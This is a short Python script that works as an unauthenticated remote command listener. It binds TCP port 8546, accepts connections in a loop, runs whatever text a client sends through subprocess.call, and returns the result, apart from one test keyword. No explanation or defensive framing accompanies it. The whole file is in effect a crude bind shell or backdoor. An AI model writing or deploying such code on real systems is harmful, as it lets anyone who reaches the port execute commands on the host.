import socket
from subprocess import call as cs


codes = {
    '///test' : lambda : 'ok!'
}






def C(ms):
    try:
        return codes[ms]()
    except:
        return cs(ms)




s = socket.socket()
port = 8546
ip = socket.gethostbyname(socket.gethostname())
s.bind((ip, port))
s.listen()
while True:
    c, addr = s.accept()
    print('Connected')
    try:
        m = C(c.recv(1024).decode())
    except: m = 0
    c.send(str(m).encode())
    c.close()
    del c
    print('did and dis!')




